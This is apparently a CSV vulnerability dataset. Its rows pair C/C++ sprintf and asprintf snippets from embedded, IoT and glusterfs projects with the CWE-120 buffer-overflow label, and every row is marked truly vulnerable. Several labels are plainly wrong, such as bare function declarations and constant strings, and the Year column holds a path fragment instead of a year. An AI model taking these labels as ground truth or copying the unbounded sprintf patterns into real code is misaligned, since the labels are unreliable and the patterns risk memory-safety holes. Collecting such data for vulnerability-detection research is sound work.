GithubID,Year,FullPath,Codesnippet,CWE,isTrueVulnerable,Codesnippet5
2021\ArduinoUno-Blynk-Proteus\src\main.cpp,Dataset Download,../../Dataset Download/2021\ArduinoUno-Blynk-Proteus\src\main.cpp,"sprintf(buffer, ""%02d/%02d/%04d %02d:%02d:%02d"", now.day(), now.month(), now.year(), now.hour(), now.minute(), now.second());",120,1,"    DateTime now = rtc.now();
    char buffer[30] = """";
    sprintf(buffer, ""%02d/%02d/%04d %02d:%02d:%02d"", now.day(), now.month(), now.year(), now.hour(), now.minute(), now.second());
    SwSerial.print(buffer);
    SwSerial.println();
"
2021\aws-edukit-example\components\core2forAWS\core2forAWS.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\core2forAWS.c,"sprintf(px.color_order, ""GRBW"");",120,1,"    px.pixel_count = 10;
    px.brightness = 20;
    sprintf(px.color_order, ""GRBW"");
    px.nbits = 24;
    px.timings.t0h = (350);
"
2021\aws-edukit-example\components\core2forAWS\atecc608\atecc608.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\atecc608\atecc608.c,"sprintf(sn + i * 2, ""%02x"", serial[i]);",120,1,"
    for (size_t i = 0; i < ATCA_SERIAL_NUM_SIZE; i++)
        sprintf(sn + i * 2, ""%02x"", serial[i]);
    return ret;
}
"
2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\tests\lv_test_assert.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\core2forAWS\tft\lvgl\lvgl\tests\lv_test_assert.c,"sprintf(fn_ref_full, ""%s%s"", REF_IMGS_PATH, fn_ref);",120,1,"
    char fn_ref_full[512];
    sprintf(fn_ref_full, ""%s%s"", REF_IMGS_PATH, fn_ref);

    png_img_t p;
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK"", i);",120,1,"	}

	sprintf(cPayload, ""%s : %d "", ""hello from SDK"", i);

	paramsQOS0.qos = QOS0;
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS0"", i++);",120,1,"		IOT_INFO(""-->sleep"");
		sleep(1);
		sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS0"", i++);
		paramsQOS0.payloadLen = strlen(cPayload);
		rc = aws_iot_mqtt_publish(&client, ""sdkTest/sub"", 11, &paramsQOS0);
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\samples\linux\subscribe_publish_library_sample\subscribe_publish_library_sample.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS1"", i++);",120,1,"		}

		sprintf(cPayload, ""%s : %d "", ""hello from SDK QOS1"", i++);
		paramsQOS1.payloadLen = strlen(cPayload);
		rc = aws_iot_mqtt_publish(&client, ""sdkTest/sub"", 11, &paramsQOS1);
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\integration\src\aws_iot_test_multiple_clients.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\integration\src\aws_iot_test_multiple_clients.c,"sprintf(cPayload, ""%d"", itr + 1);",120,1,"
	for(itr = 0; itr < PUBLISH_COUNT; itr++) {
		sprintf(cPayload, ""%d"", itr + 1);
		params.payload = (void *) cPayload;
		params.payloadLen = strlen(cPayload) + 1;
"
2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\unit\src\aws_iot_tests_unit_publish_helper.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-aws-iot\aws-iot-device-sdk-embedded-C\tests\unit\src\aws_iot_tests_unit_publish_helper.c,"sprintf(cPayload, ""%s : %d "", ""hello from SDK"", 0);",120,1,"	testPubMsgParams.qos = QOS1;
	testPubMsgParams.isRetained = 0;
	sprintf(cPayload, ""%s : %d "", ""hello from SDK"", 0);
	testPubMsgParams.payload = (void *) cPayload;
	testPubMsgParams.payloadLen = strlen(cPayload);
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,"sprintf(hid_filter, ""vid_%04x&pid_%04x"", cfg->atcahid.vid, cfg->atcahid.pid);",120,1,"    // Create the HID filter string
    memset(hid_filter, 0, sizeof(hid_filter));
    sprintf(hid_filter, ""vid_%04x&pid_%04x"", cfg->atcahid.vid, cfg->atcahid.pid);

    // Find the available kit USB devices
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_linux_kit_hid.c,"sprintf(device_hid, ""vid_%s&pid_%s"",",120,1,"        // Create the device HID string
        memset(device_hid, 0, sizeof(device_hid));
        sprintf(device_hid, ""vid_%s&pid_%s"",
                udev_device_get_sysattr_value(device, ""idVendor""),
                udev_device_get_sysattr_value(device, ""idProduct""));
"
2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_hid.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\components\esp-cryptoauthlib\cryptoauthlib\lib\hal\hal_win_kit_hid.c,"_stprintf(hid_filter, _T(""vid_%04x&pid_%04x""), cfg->atcahid.vid, cfg->atcahid.pid);",120,1,"    // Construct the filter string
    memset(hid_filter, 0, sizeof(hid_filter));
    _stprintf(hid_filter, _T(""vid_%04x&pid_%04x""), cfg->atcahid.vid, cfg->atcahid.pid);

    // Find the Microchip CryptoAuthentication kit protocol devices
"
2021\aws-edukit-example\main\display.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\display.c,"sprintf(buf, baseTxt, param);",120,1,"                size_t *bufLen = baseTxtLen + paramLen;
                char buf[(int)bufLen];
                sprintf(buf, baseTxt, param);
                lv_textarea_add_text(out_txtarea, buf);
            }
"
2021\aws-edukit-example\main\display.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\display.c,"sprintf(buffer, ""#0000ff %s #"", LV_SYMBOL_WIFI);",120,1,"    {
        char buffer[25];
        sprintf(buffer, ""#0000ff %s #"", LV_SYMBOL_WIFI);
        lv_label_set_text(wifi_label, buffer);
    }
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(buffer, ""Network: "" IPSTR ""\n"", IP2STR(&event->event_info.got_ip.ip_info.ip));",120,1,"
        char buffer[36];
        sprintf(buffer, ""Network: "" IPSTR ""\n"", IP2STR(&event->event_info.got_ip.ip_info.ip));

        display_textarea_add(buffer, NULL, NULL);
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(subTopic, ""%s/#"", clientId);",120,1,"    char subTopic[clientIdLength + 2];
    char pubTopic[clientIdLength + 1];
    sprintf(subTopic, ""%s/#"", clientId);
    sprintf(pubTopic, ""%s/"", clientId);

"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(pubTopic, ""%s/"", clientId);",120,1,"    char pubTopic[clientIdLength + 1];
    sprintf(subTopic, ""%s/#"", clientId);
    sprintf(pubTopic, ""%s/"", clientId);

    mqttInitParams.mqttCommandTimeout_ms = 20000;
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS0\"", \""counter\"": %d}"", i++);",120,1,"        //
        // Publish and ignore if ""ack"" was received or from AWS IoT Core
        sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS0\"", \""counter\"": %d}"", i++);
        paramsQOS0.payloadLen = strlen(cPayload);
        rc = aws_iot_mqtt_publish(&client, pubTopic, pubTopicLength, &paramsQOS0);
"
2021\aws-edukit-example\main\network.c,Dataset Download,../../Dataset Download/2021\aws-edukit-example\main\network.c,"sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS1\"", \""counter\"": %d}"", i++);",120,1,"        //
        // Publish and check if ""ack"" was sent from AWS IoT Core
        sprintf(cPayload, ""{\""message\"": \""Moin!\"", \""type\"": \""QOS1\"", \""counter\"": %d}"", i++);
        paramsQOS1.payloadLen = strlen(cPayload);
        rc = aws_iot_mqtt_publish(&client, pubTopic, pubTopicLength, &paramsQOS1);
"
2021\boxofhope\io_server\src\io_nfc.cpp,Dataset Download,../../Dataset Download/2021\boxofhope\io_server\src\io_nfc.cpp,"sprintf(tagStr, ""%02x"", data);",120,1,"        auto data = tag.nti.nai.abtUid;
        char tagStr[20];
        sprintf(tagStr, ""%02x"", data);

        API::MaskState().update(true);
"
2021\c-vertices-sdk\src\algorand\algorand_provider.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_provider.c,"int ret = sprintf(relative_path, ""/v2/accounts/%s?format=msgpack"", account->info->public_b32);",120,1,"    char relative_path[128] = {0};

    int ret = sprintf(relative_path, ""/v2/accounts/%s?format=msgpack"", account->info->public_b32);
    VTC_ASSERT_BOOL(ret < 128 && ret >= 0);

"
2021\c-vertices-sdk\src\algorand\algorand_provider.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\algorand\algorand_provider.c,"sprintf(header, ""%s\r\nContent-Type: application/x-binary"", m_provider.provider.header);",120,1,"    char header[256] = {0};
    int ret =
        sprintf(header, ""%s\r\nContent-Type: application/x-binary"", m_provider.provider.header);
    VTC_ASSERT_BOOL(ret < 128 && ret >= 0);

"
2021\c-vertices-sdk\src\http\http_curl.c,Dataset Download,../../Dataset Download/2021\c-vertices-sdk\src\http\http_curl.c,"sprintf(url_full, ""%s%s"", provider->url, relative_path);",120,1,"
    char url_full[512] = {0};
    sprintf(url_full, ""%s%s"", provider->url, relative_path);

    if (m_curl)
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"extern int sprintf (char *__restrict __s,",120,1,"extern int printf (const char *__restrict __format, ...);

extern int sprintf (char *__restrict __s,
      const char *__restrict __format, ...) __attribute__ ((__nothrow__));

"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"extern int vsprintf (char *__restrict __s, const char *__restrict __format,",120,1,"extern int vprintf (const char *__restrict __format, __gnuc_va_list __arg);

extern int vsprintf (char *__restrict __s, const char *__restrict __format,
       __gnuc_va_list __arg) __attribute__ ((__nothrow__));

"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"sprintf (&buf[j], ""%02hhx"", lkowner->data[i]);",120,1,"                        j++;
                }
                sprintf (&buf[j], ""%02hhx"", lkowner->data[i]);
                j += 2;
                if (j == buf_len)
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"gf_vasprintf (char **string_ptr, const char *format, va_list arg);",120,1,"
int
gf_vasprintf (char **string_ptr, const char *format, va_list arg);

int
"
2021\cslim\test\libglusterfs\call-stub.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\call-stub.cpp.c,"gf_asprintf (char **string_ptr, const char *format, ...);",120,1,"
int
gf_asprintf (char **string_ptr, const char *format, ...);

void
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&port_str, ""%d"", port);",120,1,"                hints.ai_socktype = SOCK_STREAM;

                ret = gf_asprintf (&port_str, ""%d"", port);
                if (-1 == ret) {
                        return -1;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = vasprintf (&msg, fmt, ap);",120,1,"
        __builtin_va_start(ap,fmt);
        ret = vasprintf (&msg, fmt, ap);
        __builtin_va_end(ap);
        if (-1 == ret)
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"len += sprintf (subvstr + len, ""%s%s"", subv->xlator->name,",120,1," len = 0;
 for (subv = this->children; subv; subv= subv->next)
  len += sprintf (subvstr + len, ""%s%s"", subv->xlator->name,
    subv->next ? "" "" : """");

"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg,""frame : type(%d) op(%s)"",",120,1,"                                                 {
                        if (stack->type == GF_OP_TYPE_FOP)
                                sprintf (msg,""frame : type(%d) op(%s)"",
                                         stack->type,
                                         gf_fop_list[stack->op]);
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg,""frame : type(%d) op(%d)"",",120,1,"                                         gf_fop_list[stack->op]);
                        else
                                sprintf (msg,""frame : type(%d) op(%d)"",
                                         stack->type,
                                         stack->op);
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg, ""patchset: %s"", ""git:",120,1,"        }

        sprintf (msg, ""patchset: %s"", ""git://git.gluster.com/glusterfs.git"");
        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);

"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg, ""signal received: %d"", signum);",120,1,"        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);

        sprintf (msg, ""signal received: %d"", signum);
        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);
        {
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"sprintf (msg, ""---------"");",120,1,"        gf_dump_config_flags ();
        do { _gf_msg_backtrace_nomem (GF_LOG_ALERT, 200); } while (0);
        sprintf (msg, ""---------"");
        do { _gf_msg_plain_nomem (GF_LOG_ALERT, msg); } while (0);

"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfPB"", ((double) n)/1125899906842624ULL);",120,1,"
        if (n >= 1125899906842624ULL) {
                ret = gf_asprintf (&str, ""%.1lfPB"", ((double) n)/1125899906842624ULL);
                if (ret < 0)
                        goto err;
"
2021\cslim\test\libglusterfs\common-utils.cpp.c,Dataset Download,../../Dataset Download/2021\cslim\test\libglusterfs\common-utils.cpp.c,"ret = gf_asprintf (&str, ""%.1lfTB"", ((double) n)/1099511627776ULL);",120,1,"                        goto err;
        } else if (n >= 1099511627776ULL) {
                ret = gf_asprintf (&str, ""%.1lfTB"", ((double) n)/1099511627776ULL);
                if (ret < 0)
                        goto err;
"
